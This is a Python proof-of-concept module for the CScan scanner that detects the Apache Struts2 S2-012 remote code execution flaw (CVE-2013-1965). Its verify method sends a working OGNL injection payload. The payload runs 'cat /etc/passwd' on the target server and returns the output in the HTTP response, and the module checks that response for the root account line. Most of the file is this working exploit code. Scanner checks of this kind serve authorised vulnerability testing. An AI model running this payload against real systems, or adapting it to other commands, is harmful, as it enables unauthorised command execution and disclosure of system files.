# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0007_p'  # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-012远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-05-23'  # 漏洞公布时间
    desc = '''S
        Apache Struts2中存在漏洞，该漏洞源

        OGNL提供，除其他功能，广泛表达评价的能力。

        一个请求，包括特制的请求参数可以用来为物业注入任意ognl代码，后来作为一个重定向地址请求参数，这将导致进一步的评估。 
    '''  # 漏洞描述
    ref = 'https://cwiki.apache.org/confluence/display/WW/S2-012'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2013-1965'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    product_version = 'Apache Struts2.0.0 - 2.3.13'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '99c959f7-41b8-4747-bf28-500847b43485'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = {'name': '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'}
            request = requests.get(
                '{target}/user.action'.format(target=self.target), params=payload)
            r = request.text
            if 'root:x:0:0:root:/root:/bin/bash' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
